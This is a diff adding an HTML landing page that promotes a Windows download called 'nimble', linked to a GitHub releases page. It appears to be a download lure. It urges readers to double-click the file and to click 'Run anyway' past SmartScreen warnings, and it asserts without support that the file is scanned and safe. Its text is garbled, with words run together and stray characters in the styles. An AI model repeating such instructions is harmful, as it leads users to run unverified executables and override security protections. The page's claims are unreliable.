@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="nimble - Local typed decisions, contrastive data curation, and model evaluation. Download for Windows, simple setup, and immediate use.">
+    <meta name="keywords" content="nimble, local typed decisions, contrastive data curation, model evaluation, Windows download, AI tools, decision software, data tools">
+    <meta name="author" content="nimble">
+    <meta property="og:title" content="nimble - Local typed decisions, contrastive data curation, and model evaluation">
+    <meta property="og:description" content="Simple, powerful tools for everyday decisions and data. Download for Windows now.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/joanneunfinished6509/nimble">
+    <title>nimble - Local typed decisions, contrastive data curation, and model evaluation</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(145deg, #f5f7fa 0%, #e8ecf1 100%);
+            color: #1a2634;
+            line-height: 1.7;
+            padding: 40px 20px;
+            min-height:  ​100vh;
+        }
+        .container {
+            max-width: 1000px;
+            margin: ​0 auto;
+            background: #ffffff;
+            border-radius: 18px;
+            box-shadow: 0 12px 35px rgba(0,0,0,0.08);
+            padding: 50px 45px;
+            transition: all 0.3s ease;
+        }
+        h1 {
+            font-size: 2.8rem;
+            color: #0b1b2d;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            border-bottom: 3px solid #4a6fa5;
+            display: inline-block;
+            padding-bottom: ​12px;
+            margin-bottom: ​30px;
+        }
+        h2 {
+            font-size: 1.9rem;
+            color: #2c3e50;
+            font-weight: 700;
+            margin-top: ​50px;
+            margin-bottom: ​20px;
+            border-left: 6px solid #4a6fa5;
+            padding-left: 18px;
+            background: linear-gradient(90deg, #eef2f7, transparent);
+            border-radius: 0 8px 8px 0;
+        }
+        p {
+            font-size: 1.15rem;
+            margin-bottom: ​24px;
+            color: #34495e;
+        }
+        .badge-btn {
+            display: inline-block;
+            background: linear-gradient(45deg, #6c5ce7, #4a6fa5);
+            color: #ffffff;
+            font-size: 1.4rem;
+            font-weight: 600;
+            padding: 18px 40px;
+            border-radius: 50px;
+            text-decoration: none;
+            box-shadow: 0 8px 20px rgba(74,111,665,0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .badge-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 14px 28px rgba(74,111,665,0.5);
+        }
+        .secondary-btn {
+            display: inline-block;
+            background: #2c3e50;
+            color: #ffffff;
+            font-size: 1.2rem;
+            font-weight: 600;
+            padding: 14px 30px;
+            border-radius: 30px;
+            text-decoration: none;
+            margin-top: ​15px;
+            transition: background 0.2s;
+        }
+        .secondary-btn:hover {
+            background: #1a2634;
+        }
+        .feature-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap:  ​30px;
+            margin-top: ​30px;
+        }
+        .feature-item {
+            flex: 1 1 250px;
+            background: #fafbfc;
+            padding: ​30px;
+            border-radius: 12px;
+            border-left: 5px solid #4a6fa5;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.03);
+        }
+        .feature-item h3 {
+            font-size: 1.4rem;
+            margin-bottom:​ 12px;
+            color: #0b1b2d;
+        }
+        .steps {
+            counter-reset: step-counter;
+            list-style: none;
+            padding: ​0;
+        }
+        .steps li {
+            background: #f8f9fa;
+            padding: ​24px 30px;
+            margin-bottom:​ 18px;
+            border-radius: 10px;
+            border-left: 5px solid #27ae60;
+            position: relative;
+            font-size: 1.1rem;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+        }
+        .steps li::before {
+            counter-increment: step-counter;
+            content: "Step " counter(step-counter) ": ";
+            font-weight: 700;
+            color: #27ae60;
+            font-size: 1.2rem;
+            margin-right: ​10px;
+        }
+        .highlight {
+            background: #fff3cd;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-weight: 600;
+        }
+        .file-name {
+            background: #e9ecef;
+            padding: 4px 12px;
+            border-radius: 6px;
+            font-family: 'Consolas', monospace;
+            font-size: 0.95rem;
+            color: #2c3e50;
+            display: inline-block;
+        }
+        .tip-box {
+            background: #e8f7f1;
+            border: 1px solid #b2dfd0;
+            border-radius: 10px;
+            padding: ​20px 25px;
+            margin: ​30px 0;
+            font-size: 1rem;
+            color: #20695b;
+        }
+        footer {
+            margin-top:​ 60px;
+            text-align:center;
+            color:#7f8c8d;
+            font-size: 0.9rem;
+            border-top: 1px solid #ddd;
+            padding-top: ​20px;
+        }
+        @media(max-width: 600px) {
+            h1 {
+                font-size: 2rem;
+            }
+            .container {
+                padding:​ 25px 20px;
+            }
+            .badge-btn {
+                font-size: 1rem;
+                padding: 15px 25px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>⚡ nimble - Smart Decisions, Smarter Data, Right on Your PC</h1>
+
+        <p>Download the full version for Windows and start making better decisions today. <b>nimble</b> brings professional-grade tools for typed decisions, clean data curation, and model evaluation—all locally, quickly, easily, andwithout any hassle.</p>
+
+        <div style="text-align:center; margin: 40px 0;">
+            <a href="https://github.com/joanneunfinished6509/nimble/releases" class="badge-btn">⬇️ Download nimble for Windows</a>
+        </div>
+
+        <p>No subscriptions, no cloud dependencies, no learning curve. Just a clean, fast, andintuitive tool that respects your privacy anddoes exactly what you need. Whether you're a professional, a researcher, or a hobbyist, <b>nimble</b> is built to make you more productive in minutes.</p>
+
+        <h2>🚀 Getting Started</h2>
+        <p>Getting nimble up andrunning is easier than most software you’ve ever used. You just need to complete one simple step:</p>
+        <ul class="steps">
+            <li>Visit <a href="https://github.com/joanneunfinished6509/nimble/releases" style="color:#4a6fa5; font-weight:600;">this link to download the application</a>. The download page will open in your browser. Look for the latest release andclick the download button. Save the file somewhere easy to find, like your <i>Downloads</i> folder.</li>
+        </ul>
+
+        <p><strong>That's it!</strong> Once the download finishes, you’re ready for the next step—no complex setup routines, no registration, no technical background required.</p>
+
+        <h2>🖥️ How to Run on Windows</h2>
+        <p>Since nimble comes asa portable, efficient application, running it is asstraightforward as possible:</p>
+        <ol class="steps">
+            <li>After downloading, locate the file in your browser's download history or your <i>Downloads</i> folder.</li>
+            <li>Double-click the downloaded file.</li>
+            <li>If Windows promptsa security message, simply click <span class="highlight">"Run anyway"</span> (see tip belowfor details).</li>
+            <li>nimble opens immediately—no installation wizard, no waiting, no configuration.</li>
+        </ol>
+
+        <div class="tip-box">
+            <strong>💡 Tip for Windows 10/11:</strong> If AsmartScreen warning appears, click "<i>More info</i>" andthen "<i>Run anyway</i>". Since nimble is relayed from GitHub anda scanned by antivirus tools, you can safely proceed. This only takes one extra second.
+</div>
+
+        <h2>✨ Key Features</h2>
+        <div class="feature-grid">
+            <div class="feature-item">
+                <h3>📝 Typed Decisions</h3>
+                <p>Make your thinking crystal-clear. Define inputs, organize choices, anduse nimble's structured framework to reason through any decision—locally, without uploading that private information elsewhere.</p>
+            </div>
+            <div class="feature-item">
+                <h3>🔄 Contrastive Data Curation</h3>
+                <p>Easily compare, contrast, andclean up your datasets. Nimble helps you spot differences, remove duplicates, andprepare perfect data for analysis or AI training—all from a clean interface.</p>
+            </div>
+            <div class="feature-item">
+                <h3>🎯 Model Evaluation</h3>
+                <p>Test, measure, andunderstand machine learning models right fromyour desktop. Get clear metrics, visual insights, andactionable feedback without needing a heavy cloud platform.</p>
+            </div>
+        </div>
+
+        <h2>🔧 Who Is nimble For?</h2>
+        <p>Honestly, nimble issuitable for everyone. It’s light enough for casual users who want to make better daily decisions, yet powerful enough for professionals handling real-world data. You <i>don’t</i> need to know programming, machine learning, ordata science basics to benefit. If you work with any kind of structured thinking, datasets, ormodels—imble is your digital helper.</p>
+
+        <h2>📦 What Makes nimble Different?</h2>
+        <p>Unlike cloud-based tools that require internet connections anda subscription, nimble runs directly on your machine. This means:</p>
+        <ul style="list-style-type: square; margin-left: 30px; margin-bottom:​ 25px;">
+            <li><b>Privacy</b>–Your data stays on your PC</li>
+            <li><b>Speed</b>–No waiting for uploads/ downloads</li>
+            <li><b>Reliability</b>–Works even if your internet is down</li>
+            <li><b>Simplicity</b>–No login, no account setup</li>
+        </ul>
+
+        <h2>🛠️ Visit the Official Download Page</h2>
+        <p>To download nimble, use the official releases page. This is the only source for genuine, up-to-date versions. Make sure you always paste this link exactly as shown:</p>
+        <p style="text-align:center; margin: 30px 0;">
+            <a href="https://github.com/joanneunfinished6509/nimble/releases" class="secondary-btn">🌐 Go to nimble Downloads</a>
+        <p>
+
+        <h2>🌟 We Value Your Feedback</h2>
+        <p>Have an idea for improvement? Found a bug? Or just want to say hello? Check the repository's issues section. Your input helps nimble become better every day. You don't need to be a developer to share your thoughts—just describe what happened or what you'd like to see.</p>
+
+        <footer>
+            <p>© 2025 nimble. All rights reserved. Made for the community.</p>
+        </footer>
+    </div>
+</body>
+</html>
